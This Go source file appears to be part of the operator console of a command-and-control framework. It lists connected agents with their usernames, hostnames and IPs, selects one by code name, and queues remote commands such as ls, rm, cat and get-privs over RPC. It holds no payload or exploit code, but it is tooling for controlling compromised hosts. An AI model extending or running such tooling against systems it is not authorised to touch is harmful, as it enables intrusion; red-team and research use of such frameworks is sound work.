package commander

import (
	"context"
	"fmt"
	"os"
	"strconv"
	"time"

	"text/tabwriter"

	"github.com/execute-assembly/c2-proj/client/internal/rpc"
	"github.com/execute-assembly/c2-proj/modules/pb"
	"google.golang.org/protobuf/types/known/emptypb"
)

var ClientInUse string

func ConvertTime(unixTime string) string {
	timeInt, err := strconv.ParseInt(unixTime, 10, 64)
	if err != nil {
		return ""
	}

	t := time.Unix(timeInt, 0)
	duration := time.Since(t)

	if duration < time.Minute {
		return fmt.Sprintf("%ds", int(duration.Seconds()))
	} else if duration < time.Hour {
		return fmt.Sprintf("%dm", int(duration.Minutes()))
	} else if duration < 24*time.Hour {
		return fmt.Sprintf("%dh", int(duration.Hours()))
	}
	return fmt.Sprintf("%dd", int(duration.Hours()/24))
}

func HandleListClients() error {
	PrintOk("Listing Clients...")
	resp, err := rpc.Client.ListClients(context.Background(), &emptypb.Empty{})
	if err != nil {
		return err
	}

	if len(resp.Clients) == 0 {
		PrintInfo("No agents active")
		return nil
	}
	w := tabwriter.NewWriter(os.Stdout, 0, 0, 2, ' ', tabwriter.Debug)
	fmt.Printf("\n")
	fmt.Fprintln(w, "Code Name\tUsername\tHostname\tIP\tArch\tPID\tVersion\tLast Seen")
	fmt.Fprintln(w, "-----------\t-------------\t--------------\t------------\t------\t-----\t-------------------\t----------")
	for _, c := range resp.Clients {
		fmt.Fprintf(w, "%s\t%s\t%s\t%s\t%s\t%d\t%s\t%s\n", c.CodeName, c.Username, c.Hostname,
			c.Ip, c.Arch, c.Pid, c.Version, ConvertTime(c.LastCheckin))
	}
	w.Flush()
	fmt.Printf("\n")

	return nil
}

func UseClient(args []string) error {
	if len(args) < 1 {
		PrintErr("Must choose agents code_name")
		return fmt.Errorf("Not Enough Args")
	}

	resp, err := rpc.Client.ConvertCodeName(context.Background(), &pb.ConvertCodeMessage{CodeName: args[0]})
	if err != nil {
		PrintErr(fmt.Sprintf("Unknown Error: %s", err))
		return err
	}
	if resp.Status == 3 {
		PrintErr("User not found")
		return fmt.Errorf("user not found")
	}

	ClientInUse = resp.Guid
	PrintOk(fmt.Sprintf("Using Agent %s", BoldWhite(fmt.Sprintf("%s[%s]", args[0], ClientInUse))))

	return nil
}

var CommandMap = map[string]int{
	"ls":        0x1,
	"cd":        0x2,
	"rm":        0x3,
	"mv":        0x4,
	"cat":       0x5,
	"get-privs": 0x6,
}

func HandleLS(args []string) error {
	if ClientInUse == "" {
		PrintErr("Must choose agents code_name")
		return fmt.Errorf("No agent selected")
	}
	if len(args) < 1 {
		PrintErr("Usage: ls <path>")
		return fmt.Errorf("Not Enough Args")
	}

	resp, err := rpc.Client.SendCommand(context.Background(), &pb.CommandReqData{
		Guid:        ClientInUse,
		CommandCode: int32(CommandMap["ls"]),
		Param:       args[0],
	})
	if err != nil {
		return err
	}

	if resp.Status == 1 {
		PrintErr("User Doesnt exist!")
	} else if resp.Status == 0 {
		PrintOk("Command Queued")
	}
	return nil
}
